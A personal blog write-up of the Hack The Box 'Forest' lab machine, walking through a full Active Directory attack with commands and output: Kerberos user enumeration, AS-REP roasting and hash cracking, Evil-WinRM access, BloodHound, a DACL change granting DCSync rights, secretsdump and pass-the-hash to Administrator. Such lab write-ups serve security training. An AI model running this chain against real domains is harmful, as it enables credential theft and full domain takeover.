---
title: "CTF: HTB 2020 Forest"
toc: true
toc_label: "Table of Contents"
toc_icon: "cog"
excerpt: "This is my solution to the forest box."
classes: wide
categories:
  - Blog
tags:
  - ctf
  - writeup
  - htb
  - Redis
  - Webmin
---

# Forest

IP: 10.10.10.161

## Enum time

ran my quick autovuln script.

```
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/1# ./autovuln.sh 10.10.10.161 forest
..
Scanning 10.10.10.161 [65535 ports]
Discovered open port 139/tcp on 10.10.10.161
Discovered open port 445/tcp on 10.10.10.161
Discovered open port 135/tcp on 10.10.10.161
Discovered open port 53/tcp on 10.10.10.161
Discovered open port 49666/tcp on 10.10.10.161
Discovered open port 49677/tcp on 10.10.10.161
Discovered open port 49698/tcp on 10.10.10.161
Discovered open port 9389/tcp on 10.10.10.161
Discovered open port 88/tcp on 10.10.10.161
Discovered open port 593/tcp on 10.10.10.161
Discovered open port 49684/tcp on 10.10.10.161
Discovered open port 49667/tcp on 10.10.10.161
Discovered open port 3269/tcp on 10.10.10.161
Discovered open port 49717/tcp on 10.10.10.161
Discovered open port 464/tcp on 10.10.10.161
Discovered open port 49671/tcp on 10.10.10.161
Discovered open port 49676/tcp on 10.10.10.161
Discovered open port 47001/tcp on 10.10.10.161
Discovered open port 636/tcp on 10.10.10.161
Discovered open port 389/tcp on 10.10.10.161
Discovered open port 3268/tcp on 10.10.10.161
Discovered open port 49665/tcp on 10.10.10.161
Discovered open port 5985/tcp on 10.10.10.161
Discovered open port 49664/tcp on 10.10.10.161
...
...
[i] Reading: 'forest.xml'

[i] /usr/bin/searchsploit -t domain 
...

[i] /usr/bin/searchsploit -t microsoft windows kerberos 
...
...
[i] /usr/bin/searchsploit -t microsoft windows rpc 
...
[i] /usr/bin/searchsploit -t microsoft windows active directory 
...
...
[i] /usr/bin/searchsploit -t microsoft windows rpc 
...
[i] /usr/bin/searchsploit -t microsoft windows rpc over 
...
[i] /usr/bin/searchsploit -t microsoft windows rpc over http 
...

[i] /usr/bin/searchsploit -t tcpwrapped 
[-] Skipping term: microsoft    (Term is too general. Please re-search manually: /usr/bin/searchsploit -t microsoft )
[i] /usr/bin/searchsploit -t microsoft httpapi 

[-] Skipping term: net    (Term is too general. Please re-search manually: /usr/bin/searchsploit -t net )

[i] /usr/bin/searchsploit -t net message 
..
[i] /usr/bin/searchsploit -t net message framing 
```

just a couple of ports and a couple potential leads, *shrug*

anyway that information wasn't really enough to work with so i added to my tool a check with `enum4linux`.
i did this because my enumeration on windows is lacking.

~~windows boxes are hard~~

tried 

`smb enum 
nmap -p445 -sV --script smb-enum-services`

## shoulders of giants

I was getting nowhere, so i started following a guide on attacking windows (https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)

```
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Forest# python ../1/kerbrute.py -domain HTB -users users.txt -passwords /usr/share/wordlists/rockyou.txt -dc-ip 10.10.10.161
Impacket v0.9.21.dev1+20200219.164620.d757c3a4 - Copyright 2020 SecureAuth Corporation

[*] Valid user => sebastien
[*] Valid user => lucinda
[*] Valid user => svc-alfresco [NOT PREAUTH]
[*] Valid user => andy
[*] Valid user => mark
[*] Valid user => santi
[*] Valid user => Administrator
[*] Blocked/Disabled user => Guest
[*] Blocked/Disabled user => krbtgt
[*] Blocked/Disabled user => DefaultAccount
[*] Blocked/Disabled user => $331000-VK4ADACQNUCA
[*] Blocked/Disabled user => SM_2c8eef0a09b545acb
[*] Blocked/Disabled user => SM_ca8c2ed5bdab4dc9b
[*] Blocked/Disabled user => SM_75a538d3025e4db9a
[*] Blocked/Disabled user => SM_681f53d4942840e18
[*] Blocked/Disabled user => SM_1b41c9286325456bb
[*] Blocked/Disabled user => SM_9b69f1b9d2cc45549
[*] Blocked/Disabled user => SM_7c96b981967141ebb
[*] Blocked/Disabled user => SM_c75ee099d0a64c91b
[*] Blocked/Disabled user => SM_1ffab36a2f5f479cb
```


which gave me  something to test `GetNPUsers.py` with.
```
root@Bread:/opt/impacket/examples# python GetNPUsers.py HTB/* -usersfile /mnt/hgfs/CTFS/HackTheBox.eu/boxes/Forest/users.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.161
Impacket v0.9.21.dev1+20200219.164620.d757c3a4 - Copyright 2020 SecureAuth Corporation

Password:
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
```

oh we got a hash from `svc-alfresco@HTB`
lets crack it.

```
root@Bread:/opt/impacket/examples# cat hashes.asreproast 
$krb5asrep$23$svc-alfresco@HTB:d2c69129223778dc8d4b17dc4d247c32$9c2cef3fbbac76e816add56021428a2353722cd08bcfc120f75806d2d87a5c3e5d9b8adba79e2d1b30fffd32f61048fb07c5d8527e97380d6d6eded3b71ec4735a2dddbab22044b2df32cfa61afd26e25622ba2c18bb523be6e4d30e3dfd7d54914ce6486740dbfc2f02e0ab25f926ef0d83cb4c917fcc005a5ed9f84e5188c5f2a7ec37738b81e7b29aec7e8127ca1053100fb9ea046e104a293ea9529cd0f8297f92098eef3910e90d86d830b4d18a776af0c2f8856aed87bd7dc8594dda5d69f64cc90f2ed981f8c14ab1eb8fe622ee11fa199f2d375688a320c5e14bf25c
root@Bread:/opt/impacket/examples# hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt
...
$krb5asrep$23$svc-alfresco@HTB:d2c69129223778dc8d4b17dc4d247c32$9c2cef3fbbac76e816add56021428a2353722cd08bcfc120f75806d2d87a5c3e5d9b8adba79e2d1b30fffd32f61048fb07c5d8527e97380d6d6eded3b71ec4735a2dddbab22044b2df32cfa61afd26e25622ba2c18bb523be6e4d30e3dfd7d54914ce6486740dbfc2f02e0ab25f926ef0d83cb4c917fcc005a5ed9f84e5188c5f2a7ec37738b81e7b29aec7e8127ca1053100fb9ea046e104a293ea9529cd0f8297f92098eef3910e90d86d830b4d18a776af0c2f8856aed87bd7dc8594dda5d69f64cc90f2ed981f8c14ab1eb8fe622ee11fa199f2d375688a320c5e14bf25c:s3rvice
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB:d2c69129223778dc8d4b...4bf25c
Time.Started.....: Thu Feb 20 23:51:12 2020 (41 secs)
Time.Estimated...: Thu Feb 20 23:51:53 2020 (0 secs)
...
```

ok sick we have creds!

## pop lock alfresco 

with our creds `svc-alfresco:s3rvice` we can now test evil-wimrm to see if we can log in.

```
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Forest# ruby ../1/evil-winrm/evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
e5e4e47ae7022664cda6eb013fb0d9ed
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> 
```

excellent thats user done. and we know we have user creds.


## Bloodhound

so next i decided to find out about the user, so i started using bloodhound (https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)

```
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Forest# neo4j console 
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Forest# bloodhound
```


```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod All -Domain htb.local -ZipFileName bread.zip
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download bread.zip
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> rm *
```

## Bloodhound cont.

so bloodhound is really useful and after looking for ways to get to the administrator account i found this link (https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
which matched the path required/set out by bloodhound.
so lets do this.

create a PS session
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = Get-Credential
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> New-PSSession -ComputerName "10.10.10.161" -Authentication Negotiate -Credential $cred
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Enter-PSSession 21
```

add ourselves to the Exchange Windows Permissions and DACL abuse
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $acl = get-acl "ad:DC=htb,DC=local"
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $id = [Security.Principal.WindowsIdentity]::GetCurrent()
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $user = Get-ADUser -Identity $id.User
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $identity = [System.Security.Principal.IdentityReference] $sid
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $adRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericAll"
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $type = [System.Security.AccessControl.AccessControlType] "Allow"
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$inheritanceType
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $acl.AddAccessRule($ace)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Set-acl -aclobject $acl "ad:DC=htb,DC=local"
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Get-ADGroupMember -Identity "Exchange Windows Permissions"

```

dcsync like the docs said we could.
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # lsadump::dcsync /domain:htb.local /user:Administrator
```
hmm...

lets just try it remotely

```
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Forest# python secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc


```

## Bloodhound win

pass the hash to win
```
root@Bread:/mnt/hgfs/CTFS/HackTheBox.eu/boxes/Forest# ./evil-winrm.rb -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
f048153f202bbb2f82622b04d79129cc
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

### bonus

after completing this box i noticed people where complaining about exfiltration and uploading to windows boxes.

*please note:* `evil-winrm` has `download` and `upload` features and 2 really handy flags -e (executables) and -s (scripts)
look at your tools people.
